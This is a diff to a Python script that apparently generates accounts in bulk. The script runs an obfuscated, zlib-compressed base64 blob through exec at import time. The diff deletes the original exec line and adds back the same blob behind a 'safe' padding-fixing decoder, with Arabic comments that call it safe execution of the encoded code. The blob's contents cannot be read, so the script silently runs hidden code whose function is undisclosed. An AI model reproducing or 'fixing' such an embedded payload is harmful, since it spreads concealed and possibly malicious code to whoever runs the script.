@@ -64,7 +64,18 @@ class AppState:
 
 state = AppState()
 
-exec(__import__('zlib').decompress(__import__('base64').b64decode('eJzNU9Fq2zAUfe9XaH6JzDqxBLaHwkYX14yylYY4G+RJKNK1fVdHMpJC45X8e+XYNHEN2x5333Q499x7z7EvZCWcIxnInUXfpLpADVcXJNRiSj6R6CtosMKDmjfXSSm0huo76oe52fOoores1hGl+i2gmdGAX7Dr92XniUW/ClUUdEQU6KXo7vKm8Fd+1c4HXY4dFYRWPy7jNx3nYbtOMC+mTCfhnUNLAteMdkaVACDTzUBRNOIvIKvAfryFvSwwoL9C4mubGEE9TECl0Anc7i+EU8qO2sJnn0NDSALaaHJ3cYobPDn24DLW1Tey5qDBc1lRGK1pVAzUvYX7V7jc/DjIxGkzd/8Z2Ek0arHbsGMZymtJUYnWPBvqQZ/5aug6ubyftXNXlpkFiXYAMp0JmGRzrsvjzid/c3KU/myeW59u3Pk721UAoUV8KLIBVedNN4cCy3ZhssOZkTd4KbysgH7vA3jCLqFmK9xfRMOWatVPwv35zDQosgB7SP578JZXHLszRZpqs+myi5Xy5/LFbpTQvw+Zpn62yV3kWvfSm3Qg4CGii1foWpNPjbX3yGlMKVFW6YK8Xsw8ejjeGfAeeDmc8okEiu'.encode())).decode())
+# دالة آمنة لفك تشفير Base64 لتجنب خطأ الـ Padding
+def safe_b64decode(b64_str):
+    if isinstance(b64_str, str):
+        b64_str = b64_str.encode('utf-8')
+    padding = 4 - (len(b64_str) % 4)
+    if padding < 4:
+        b64_str += b'=' * padding
+    return base64.b64decode(b64_str)
+
+# تنفيذ الكود المشفر بطريقة آمنة
+encoded_payload = 'eJzNU9Fq2zAUfe9XaH6JzDqxBLaHwkYX14yylYY4G+RJKNK1fVdHMpJC45X8e+XYNHEN2x5333Q499x7z7EvZCWcIxnInUXfpLpADVcXJNRiSj6R6CtosMKDmjfXSSm0huo76oe52fOoores1hGl+i2gmdGAX7Dr92XniUW/ClUUdEQU6KXo7vKm8Fd+1c4HXY4dFYRWPy7jNx3nYbtOMC+mTCfhnUNLAteMdkaVACDTzUBRNOIvIKvAfryFvSwwoL9C4mubGEE9TECl0Anc7i+EU8qO2sJnn0NDSALaaHJ3cYobPDn24DLW1Tey5qDBc1lRGK1pVAzUvYX7V7jc/DjIxGkzd/8Z2Ek0arHbsGMZymtJUYnWPBvqQZ/5aug6ubyftXNXlpkFiXYAMp0JmGRzrsvjzid/c3KU/myeW59u3Pk721UAoUV8KLIBVedNN4cCy3ZhssOZkTd4KbysgH7vA3jCLqFmK9xfRMOWatVPwv35zDQosgB7SP578JZXHLszRZpqs+myi5Xy5/LFbpTQvw+Zpn62yV3kWvfSm3Qg4CGii1foWpNPjbX3yGlMKVFW6YK8Xsw8ejjeGfAeeDmc8okEiu'
+exec(__import__('zlib').decompress(safe_b64decode(encoded_payload)).decode())
 
 class ProtoBuilder:
     @staticmethod
@@ -259,7 +270,6 @@ def generate():
     state.exit_flag = False
     state.success_count = 0
     
-    # مسح الملف القديم أو البدء من جديد إن أردت
     if os.path.exists(Config.ACCOUNTS_FILE):
         try:
             os.remove(Config.ACCOUNTS_FILE)
